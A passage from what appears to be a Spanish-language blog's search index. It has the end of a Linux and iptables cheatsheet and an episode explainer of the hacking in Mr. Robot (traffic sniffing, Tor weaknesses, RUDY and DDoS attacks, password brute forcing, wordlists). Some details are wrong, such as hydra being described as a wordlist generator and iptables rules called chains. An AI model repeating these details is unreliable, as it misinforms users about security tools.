 Crear      useradd -m -shell &lt;/ruta/ala/shell&gt; &lt;nombre&gt;      Crea un nuevo usuario con su directorio home y se especifica su shell por default              Cambiar contraseña      passwd &lt;usuario&gt;      Cambia/establece la contraseña para el usuario especificado              Eliminar      userdel &lt;usuario&gt;      Elimina el usuario especificado      Grupos            Acción      Comando      Descripción                  Crear      groupadd &lt;nombre&gt;      Crea un grupo con el nombre especificado              Agregar usuarios      usermod -aG &lt;grupo&gt; &lt;usuario&gt;      Agrega el usuario al grupo especificado      iptablesLos siguientes comandos se ejecutan con sudo o con usuario root.Filter Table            Acción      Comando      Descripción                  Política de entrada      iptables --policy INPUT &lt;ACCEPT/DROP&gt;      Establece la política de entrada a aceptar/rechazar              Filtrar por ip      iptables -I INPUT -s &lt;ip&gt; -j DROP      Rechaza la conexión proveniente de la ip especificada                     iptables -I OUTPUT -d &lt;ip&gt; -j DROP      Rechaza las conexiones a la ip especificada              Filtrar por puerto      iptables -I INPUT -p tcp --dport 80 -j DROP      Rechaza las conexiones tcp al puerto 80              Listar cadenas      iptables -L --line-numbers      Lista las cadenas con numeración              Eliminar cadena      iptables -D INPUT &lt;n&gt;      Elimina la cadena especificada      ",
            "date": "2023-04-14T00:00:00+00:00",
            "objectID": "http://localhost:4000/linux-cheatsheet/",
            "id": "http://localhost:4000/linux-cheatsheet/",
            "tags": ["[&quot;cheatsheet&quot;, &quot;linux&quot;]"],
            "title": "Cheatsheet de Linux",
            "uri": "/linux-cheatsheet/"
        },
        
        {
            "categories": ["mr_robot"],
            "content": "Hello FriendEl café de RonConexión de fibra ópticaEsta escena es una de mis favoritas, Elliot está en El Café de Ron, entra Ron, el dueño del local, y Elliot lo confronta. Primero le dice que la razón que va ahí es porque el Wi-Fi es rápido, tiene conexión de fibra óptica con velocidades gigabit.En el presente muchas de nuestras casas ya cuentan con conexión de fibra óptica, pero para el año en el que salió la serie (2015), la fibra óptica aún era una novedad. Justo esto fue lo que le pareció extraño a Elliot, por lo que procedió a interceptar el tráfico de la red.Interceptar el tráfico de la redLa serie no dice con qué herramienta Elliot hizo esto, pero algunas de las herramientas que se pueden usar para este fin son wireshark y tcpdump. Este proceso consiste en estar conectado a una red y con una de las herramientas mencionadas empezar a escuchar las comunicaciones que viajan por esa red. Es como si estando en un parque te enfocas en las dos personas que están sentadas conversando y agudizas tu oído para captar todo lo que están diciendo.Interceptar/escuchar el tráfico de una red nos da la oportunidad de verificar que la red está en buenas condiciones, notar tráfico inusual o, incluso, espiar.A continuación, Elliot dice que decidió hackear a Ron, no se especifica qué hizo exactamente, pero es probable que con el análisis del tráfico de la red diera con el sitio que Ron estaba operando, Los chicos de Plato, ingresara (de alguna forma) como administrador y copiara todo el contenido del sitio como evidencia, incluso los correos.ServidoresUn servidor es una computadora dedicada a proveer recursos a otras computadoras. El tipo de servidor que se menciona aquí es un servidor web, el cual provee el contenido de Los chicos de Plato. Si el servidor es cerrado y borrado, este sitio y todo su contenido dejan de existir.La razón de que Elliot haya confrontado a Ron es porque si lo hacía de manera remota, había la posibilidad que Ron huyera y cerrara los servidores de su sitio.Red TorTor es una red que funciona de forma especial: está enfocada a anonimizar a sus usuarios. Quienes se conectan a esta red quieren dificultar el proceso de ser identificados. La red Tor utiliza el protocolo onion para lograr enmascarar a sus usuarios.Protocolo onionEste protocolo trabaja por capas (por eso el onion), con estas capas logra ofuscar la identificación de los usuarios y encriptar sus comunicaciones.Pese a todo esto, como Elliot dice: la red Tor no es tan anónima como crees. Vamos, no es una herramienta mágica que te hace invisible, aún en su diseño tiene algunos puntos débiles. Si alguien analiza el tamaño de los mensajes y la frecuencia de la comunicación entre el usuario y en nodo de entrada, y aparte tiene acceso al nodo de salida, donde las comunicaciones ya no están encriptadas por la red Tor, es posible conocer el tráfico del usuario (justo lo que conocía Elliot).En resumen…Resumiendo lo que Elliot hizo en esta escena:  Le gustaba la velocidad de la red del café  Notó tráfico raro  Capturó y analizó el tráfico de la red  Encontró el nodo de salida de la red Tor y descubrió sus servidores de Ron  Ingresó a los servidores de Los chicos de Plato  Descargó todo su contenido y correos  Hizo una denuncia y confrontó a Ron en lo que llegaba el FBIAllsafeLog fileLos log files son archivos en lo que se lleva un registro de todas las acciones realizadas en un sistema. Este tipo de archivos son muy importantes para los administradores del sistema porque cuando ocurre un ataque o una brecha de seguridad, analizar los log files puede dar pistas de cómo ocurrió dicho ataque.Mirando el log file del servidor Elliot pudo determinar que el ataque que sufrieron fue un ataque RUDY.RUDY attackR U Dead Yet? (¿ya estás muerto?) es un ataque de tipo DoS (abajo explicado), el cual explota servidores que reciben información de formularios a través de enviar respuestas muy largas de forma muy lenta. El servidor tiene que esperar a que llegue toda la respuesta, por lo que estará siendo realentizado y no podrá atender a otros usuarios de forma efectiva. Es como si al pagar en la caja del supermercado la cuenta fuera de $1,000, y tú ingresaras una moneda de $1 cada diez segundos.Ataque DoSLos ataques de Denegación de Servicio (Denial of Service) son ataques que son muy comunes en la actualidad. Su propósito principal es impactar negativamente en el desempeño de un servidor para hacerlo lento, impedir que usuarios legítimos accedan a él y, en casos extremos, dejarlo inoperativo.El ataque RUDY es un ejemplo de ataque DoS porque su meta es ocupar al servidor con peticiones lentas e inutiles, sin embargo hay más formas de ataques DoS, uno de los más comunes es el DDoS.La oficina de KrystaAtaque de fuerza brutaCuando conocemos por primera vez a Krysta sabemos que Elliot tiene acceso a sus cuentas de redes sociales y de correo, ¿cómo logró esto? Pues, al parecer utilizó una herramienta para hacerle fuerza bruta a sus cuentas. De hecho, en otras escenas podemos ver que se llama elpscrk (¿elliot-password-crack?) y la utiliza para obtener las contraseñas de Ollie y del novio de Krysta. Éste método de obtener contraseñas es conocido como ataque de fuerza bruta y consiste en probar miles e incluso millones de posibilidades hasta encontrar la correcta.Esta herramienta funciona recibiendo una lista de palabras (wordlist), que son las posibles contraseñas para el usuario de Krysta, la wordlist que utiliza Elliot contiene 9,875,894 posibles contraseñas, la contraseña correcta la encuentra en 24 segundos.En la actualidad este ataque ya no es tan fácil de hacer para sitios online, porque los firewalls detectan el ataque y lo bloquean, sin embargo aún es útil con distintos enfoques. Y también agregar que, en la vida real este tipo de ataques requieren de un gran poder de procesamiento y generalmente toman horas en llevarse a cabo.WordlistUna wordlist consiste en una lista de posibles credenciales (generalmente) con las que se intentará probar acceder a un sistema. Estas wordlists se pueden encontrar en línea recopiladas de bases de datos filtradas en el pasado como las SecLists, pero también se pueden crear especialmente para un objetivo, como lo hace Elliot para el novio de Krysta. Para ello hay que conocer ciertos datos de nuestro objetivo y con herramientas como hydra se pueden generar permutaciones de estas palabras, obteniendo una wordlist gigantesca si es necesario.Ejecutivos de E-CorpLinuxCuando los ejecutivos de E-Corp visitan Allsafe, Tyrell Wellick le dice a Elliot que al igual que él, también utiliza Linux. Y como Linux es generalmente utilizado por personas con un conocimiento más avanzado, es sorpresa para Elliot.Linux es un sistema opertativo que a diferencia de Windows es de código abierto y gratuito, esto lo hace altamente configurable y adaptable, por ello existen muchas variaciones de Linux. Kali Linux y Parrot OS son dos versiones de este sistema operativo y están pensado específicamente para hacking y pentesting. De hecho, en la serie Elliot utiliza Kali para sus ataques.Gnome y KDETambién Wellick menciona Gnome y KDE, éstos son dos entornos de escritorio muy populares en Linux, básicamente lo que hacen es darle una apariencia común a las ventanas, íconos y más en el sistema operativo. Wellick es más de KDE y, a decir verdad, yo también.            Ventanas de Gnome      Ventanas de KDE                              Ataque a AllsafeAtaque DDoSLos ataques DoS son efectivos pero también son fáciles de detectar y bloquear por los firewalls de los servidores, si se detectan patrones de denegación de servicio proviniendo de una cierta dirección IP, se bloquea esa dirección y problema solucionado.Por este motivo los atacantes han ideado ataques más complejos y más efectivos. El Distributed Denial of Service (Denegación de Servicio Distribuido) es la evolución de DoS. Con este ataque se utilizan miles o millones de dispositivos para hacer peticiones a servidores, saturandolos con tanto tráfico. De esta forma un firewall ya no es tan efectivo para diferenciar entre un atacante y un usuario legítimo que trata de utilizar el servidor.Para conocer más sobre los ataques DDoS y ver un caso real, mira el siguiente vídeo.La versión  DDoS attack          Reconfigure DNS      Reboot the servers      They are inside the network      Security protocols      Load sharing      Redirect traffic        Rootkit          Serverfarm      Backup server      Autoswitch      Switch DNS      ",
            "date": "2023-04-12T00:00:00+00:00",
            "objectID": "http://localhost:4000/1x1-hello-friend/",
            "id": "http://localhost:4000/1x1-hello-friend/",
            "tags": ["mr_robot"],
            "title": "1x1 Hello Friend",
            "uri": "/1x1-hello-friend/"
        }
        
    ]






